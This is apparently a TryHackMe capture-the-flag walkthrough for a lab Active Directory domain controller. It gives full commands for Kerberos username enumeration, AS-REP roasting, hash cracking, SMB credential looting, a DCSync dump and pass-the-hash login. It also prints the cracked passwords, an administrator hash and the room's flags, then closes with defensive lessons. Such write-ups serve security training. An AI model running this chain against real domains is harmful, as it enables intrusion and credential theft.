# Attacktive Directory - TryHackMe Walkthrough

**Room:** Attacktive Directory  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Target:** Active Directory Domain Controller  
**Domain:** spookysec.local

---

## Tools Required

- nmap
- kerbrute
- impacket (GetNPUsers.py, GetUserSPNs.py, secretsdump.py)
- smbclient
- hashcat
- evil-winrm
- enum4linux

## Wordlists Required

Download the room-specific wordlists:

```bash
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
```

---

## Step 1 - Nmap Enumeration

```bash
sudo nmap -sC -sV -T4 --min-rate=1000 <TARGET_IP>
```

### Key findings

- Port 53 - DNS
- Port 88 - Kerberos (confirms Domain Controller)
- Port 389 - LDAP (Domain: spookysec.local)
- Port 445 - SMB (signing required)
- Port 3389 - RDP
- Port 5985 - WinRM
- OS: Windows Server 2019 (build 10.0.17763)
- Domain: spookysec.local
- NetBIOS Domain: THM-AD
- Hostname: AttacktiveDirectory.spookysec.local

The presence of ports 88 (Kerberos) and 389 (LDAP) confirm this is an Active Directory Domain Controller.

---

## Step 2 - Username Enumeration with Kerbrute

Kerbrute probes Kerberos port 88 to identify valid usernames. Valid accounts return a NEED_PREAUTH or TGT response, while invalid accounts return KDC_ERR_C_PRINCIPAL_UNKNOWN. No authentication required.

```bash
kerbrute userenum --dc <TARGET_IP> -d spookysec.local userlist.txt -t 50
```

### Valid users discovered

```
administrator
james
robin
darkstar
backup
paradox
ori
svc-admin
```

Notable accounts:

- **svc-admin** - service account prefix, likely weak/static password, possible pre-auth misconfiguration
- **backup** - likely Backup Operators member, dangerous replication/registry privileges

---

## Step 3 - SMB Enumeration with enum4linux

```bash
enum4linux -a <TARGET_IP>
```

### Key findings

- Null session allowed (limited access)
- Domain SID: S-1-5-21-3591857110-2884097990-301047963
- RID cycling confirms known user accounts
- Password policy not retrievable (ACCESS_DENIED)
- No readable shares via null session

---

## Step 4 - AS-REP Roasting

AS-REP roasting targets accounts with Kerberos pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH). The KDC returns a TGT encrypted with the user's password hash without verifying identity first. This hash can be cracked offline.

```bash
impacket-GetNPUsers spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip <TARGET_IP> -format hashcat
```

### Result

svc-admin has pre-auth disabled and returns a crackable hash:

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<hash>
```

Hash type: **Kerberos 5, etype 23, AS-REP** (hashcat mode 18200)  
The etype 23 designation means RC4-HMAC encryption, which is fast to crack.

---

## Step 5 - Crack the AS-REP Hash

```bash
hashcat -m 18200 svc-admin.hash passwordlist.txt --force
```

### Result

```
svc-admin : management2005
```

---

## Step 6 - SMB Share Enumeration

With valid credentials, enumerate accessible shares:

```bash
smbclient -L \\\\<TARGET_IP> -U spookysec.local\\svc-admin%management2005
```

### Shares discovered

```
ADMIN$    - Remote Admin (default)
backup    - Non-standard, no comment
C$        - Default share
IPC$      - Remote IPC (default)
NETLOGON  - Logon server share (default)
SYSVOL    - Logon server share (default)
```

The **backup** share is non-standard and immediately interesting. Connect to it:

```bash
smbclient \\\\<TARGET_IP>\\backup -U spookysec.local\\svc-admin%management2005
```

Once connected:

```
smb: \> ls
smb: \> get backup_credentials.txt
```

### File contents

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

This is Base64 encoded. Decode it:

```bash
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
```

### Result

```
backup@spookysec.local:backup2517860
```

---

## Step 7 - DCSync via secretsdump (DRSUAPI)

The backup account has AD replication privileges (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). These are normally reserved for Domain Controllers syncing data between each other.

By abusing these privileges with secretsdump, we can pull all credential material directly from the live AD database using the **DRSUAPI** method, without touching the filesystem or needing a shell.

```bash
impacket-secretsdump backup:backup2517860@<TARGET_IP> -just-dc-user Administrator
```

### Result

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

Administrator NT hash: `0e0363213e37b94221497260b0bcb4fc`

---

## Step 8 - Pass-the-Hash with Evil-WinRM

No need to crack the Administrator hash. Use it directly to authenticate via WinRM (port 5985):

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

You now have a Domain Admin shell on the DC.

---

## Step 9 - Collect Flags

```powershell
# Root flag
cat C:\Users\Administrator\Desktop\root.txt

# svc-admin user flag (note double extension)
cat C:\Users\svc-admin\Desktop\user.txt.txt

# backup user flag
cat C:\Users\backup\Desktop\PrivEsc.txt
```

### Flags

```
svc-admin     : TryHackMe{K3rb3r0s_Pr3_4uth}
backup        : TryHackMe{B4ckM3UpSc0tty!}
Administrator : TryHackMe{4ctiveD1rectoryM4st3r}
```

---

## Full Attack Chain

```
Nmap scan
  -> Domain fingerprint: spookysec.local, DC at AttacktiveDirectory.spookysec.local

Kerbrute username enumeration
  -> Valid users: svc-admin, backup, james, robin, darkstar, paradox, ori

AS-REP Roasting (GetNPUsers)
  -> svc-admin has pre-auth disabled
  -> Kerberos 5 etype 23 AS-REP hash retrieved

Hashcat (-m 18200)
  -> svc-admin:management2005

SMBclient with svc-admin creds
  -> Non-standard "backup" share found
  -> backup_credentials.txt contains base64 encoded creds
  -> backup:backup2517860

secretsdump DRSUAPI method
  -> backup account has replication privileges
  -> Administrator NTLM hash dumped: 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM Pass-the-Hash
  -> Domain Admin shell on DC
  -> All flags collected
```

---

## Key Vulnerabilities and Lessons

**Kerberos Pre-Authentication Disabled**  
svc-admin had UF_DONT_REQUIRE_PREAUTH set, allowing unauthenticated retrieval of an offline-crackable TGT. Always enforce pre-authentication on all accounts.

**Weak Service Account Password**  
The cracked password (management2005) was in a custom wordlist. Service accounts should use long randomly generated passwords and be managed via a PAM solution.

**Credentials Stored in SMB Share**  
Plaintext (base64 is not encryption) credentials stored in a readable share. Never store credentials in files on network shares.

**Overprivileged Backup Account**  
The backup account had DS-Replication rights, equivalent to Domain Admin for credential extraction purposes. Replication privileges should only be granted to Domain Controllers. Audit AD ACLs regularly with tools like BloodHound.

**RC4 Encryption Still Negotiated**  
Etype 23 (RC4-HMAC) is fast to crack with hashcat. Enforce AES-only Kerberos encryption across the domain and disable RC4 where possible.